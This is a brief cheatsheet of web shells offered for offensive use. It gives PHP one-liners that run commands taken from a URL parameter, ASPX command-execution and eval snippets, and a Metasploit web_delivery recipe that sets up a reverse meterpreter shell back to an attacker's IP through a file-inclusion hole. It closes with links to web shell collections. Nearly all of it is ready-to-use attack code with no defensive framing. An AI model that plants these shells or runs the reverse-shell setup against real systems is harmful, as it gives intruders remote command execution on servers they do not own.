### Web Shell Cheatsheet 
### PHP webshell 
```bash 
# execute one command
<?php system("whoami"); ?

# take input from URL param (ex. shell.php?cmd=whoami)
<?php system($_GET['cmd']); ?>

# passthru input from URL param
<?php passthru($_GET['cmd']); ?>

# shell_exec to output
<?php echo shell_exec("whoami");?>

# preg_replace
<?php preg_replace('/.*/e', 'system("whoami");', ''); ?>

# backticks
<?php $output = `whoami`; echo "<pre>$output</pre>"; ?>
<?php echo `whoami`; ?>
```

### ASPX webshell 
```bash
# execute command
<%
Set rs = CreateObject("WScript.Shell")
Set cmd = rs.Exec("cmd /c whoami")
o = cmd.StdOut.Readall()
Response.write(o)
%>

# one-liner
<% eval request('cmd') %>
```

### metasploit - web delivery 
```bash
# Utilize metasploit web delivery to obtain a web shell (ex. through LFI vulnerability) - The metasploit module will generate a
# malicious PHP file which we can URL encode and spawn the reverse shell with cmd=<payload> (ex. LFI) 
use exploit/multi/script/web_delivery
set lhost <IP>
set payload php/meterpreter/reverse_tcp
set target 1 (for PHP) 
exploit
```


### resources 
```bash 
# seclists - https://github.com/danielmiessler/SecLists/tree/master/Web-Shells
# laudanum - https://github.com/jbarcia/Web-Shells/tree/master/laudanum
# nishang - https://github.com/samratashok/nishang 
# winterwolf - https://github.com/WhiteWinterWolf/wwwolf-php-webshell
# php bash - https://github.com/Arrexel/phpbash/tree/master
# webshell gui - https://github.com/cspshivam/sweetuu
```
